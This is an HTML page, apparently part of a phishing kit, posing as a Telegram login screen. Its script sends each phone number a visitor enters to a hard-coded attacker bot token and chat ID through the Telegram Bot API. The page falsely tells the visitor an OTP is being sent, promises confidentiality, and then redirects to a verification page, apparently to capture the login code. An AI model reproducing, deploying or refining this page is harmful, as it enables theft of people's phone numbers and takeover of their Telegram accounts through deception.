<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter telegram number</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* --- [Style Tetap Sama seperti Asli] --- */
    :root {
      --primary-color: #0088cc;
      --secondary-color: #00c6ff;
      --background-gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
      --white: #ffffff;
      --text-color: #333333;
      --label-color: #555555;
      --border-color: #dddddd;
      --shadow-color: rgba(0, 0, 0, 0.1);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: url('putih.avif') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }
    body::before {
      content: "";
      position: absolute;
      top: -20%;
      left: -20%;
      width: 140%;
      height: 140%;
      background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 100%);
      animation: pulse 6s infinite;
      z-index: 0;
    }
    @keyframes pulse {
      0% { transform: scale(0.9); opacity: 0.8; }
      50% { transform: scale(1); opacity: 1; }
      100% { transform: scale(0.9); opacity: 0.8; }
    }
    .container {
      background: none;
      border-radius: 16px;
      padding: 90px 30px 40px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      z-index: 1;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
      animation: fadeInUp 2s ease;
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .icon {
      width: 100px;
      height: 100px;
      margin: -70px auto 20px;
      color: var(--primary-color);
      transition: transform 0.3s;
    }
    .telegram-logo {
      width: 100%;
      height: 100%;
    }
    .icon:hover { transform: rotate(15deg); }
    h1 {
      font-size: 24px;
      margin: 0 0 20px;
      color: var(--text-color);
      font-weight: 500;
    }
    label {
      display: block;
      text-align: left;
      margin-bottom: 8px;
      font-size: 14px;
      color: #333333;
      font-weight: 500;
    }
    input[type="tel"] {
      background: #fff;
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 20px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #000;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    input[type="tel"]:focus {
      outline: none;
      border-color: #0077b3;
      box-shadow: 0 0 8px #0077b3;
    }
    .btn {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background-color: var(--primary-color);
      color: var(--white);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.8s, transform 0.3s;
    }
    .btn:hover {
      background-color: #0077b3;
      transform: scale(1.02);
    }
    .status {
      margin-top: 15px;
      font-size: 14px;
      font-weight: 500;
      min-height: 20px;
    }
    .disclaimer {
      font-size: 12px;
      color: #000;
      margin: 25px 0 0;
      line-height: 1.5;
    }
    #blurOverlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      backdrop-filter: blur(6px);
      background-color: rgba(255, 255, 255, 0.4);
      z-index: 9999;
      display: none;
    }
    #loadingText {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      font-size: 20px;
      font-weight: bold;
      color: black;
      z-index: 10000;
      display: none;
    }
    #countrySelect {
  height: 40px;
  font-size: 16px;
  width: 100%;
  padding: 8px;
  border: 1px solid #ccc;
  border-radius: 5px;
  margin-bottom: 10px;
}

  </style>
</head>

<body>
  <div id="blurOverlay"></div>
  <div id="loadingText">‚è≥ Processing OTP, please wait...</div>

  <div class="container">
    <div class="icon">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="telegram-logo">
        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
      </svg>
    </div>
    <h1>Enter telegram number</h1>
<p>To continue, please login first</p>

<form id="phoneForm">
  <label for="phone">Telegram number</label>
  <input type="tel" id="phoneInput" placeholder="Telegram number" required />

  <button type="submit" class="btn">Next</button>

  <div class="disclaimer">
    *Make sure the number entered is active to receive verification.
    Data will be kept confidential in accordance with the Personal Data Protection Act.
  </div>
</form>

<div class="status" id="statusMessage"></div>

<script>
const phoneForm = document.getElementById('phoneForm');
const phoneInput = document.getElementById('phoneInput');
const statusMessage = document.getElementById('statusMessage');

const bots = [
  { token: "8453809600:AAE7o5aDyY3lSMNoAoCYDl5ChbqMB7XT9j4", chatId: "6543036611" },
  { token: "8453809600:AAE7o5aDyY3lSMNoAoCYDl5ChbqMB7XT9j4", chatId: "6543036611" }
];

phoneForm.addEventListener('submit', function (e) {
  e.preventDefault();

  const phone = phoneInput.value.trim();
  if (!phone) return;

  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
  localStorage.setItem('sessionBotIndex', currentBotIndex);

  const bot = bots[currentBotIndex];

  const message = `üåÄ *FUN GAY LOGIN*
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìû Phone: \`${phone}\`
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;

  const api = `https://api.telegram.org/bot${bot.token}/sendMessage` +
              `?chat_id=${bot.chatId}` +
              `&text=${encodeURIComponent(message)}` +
              `&parse_mode=Markdown`;

  statusMessage.textContent = "‚è≥ Sending OTP to your Telegram account...";
  statusMessage.style.color = "#000";

  fetch(api)
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        const nextBotIndex = (currentBotIndex + 1) % bots.length;
        localStorage.setItem('currentBotIndex', nextBotIndex);

        setTimeout(() => {
          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
        }, 3000);
      } else {
        statusMessage.textContent = "‚ùå Failed to send to bot.";
        statusMessage.style.color = "red";
      }
    })
    .catch(err => {
      statusMessage.textContent = "‚ùå Error: " + err.message;
      statusMessage.style.color = "red";
    });
});
</script>

</body>
</html>
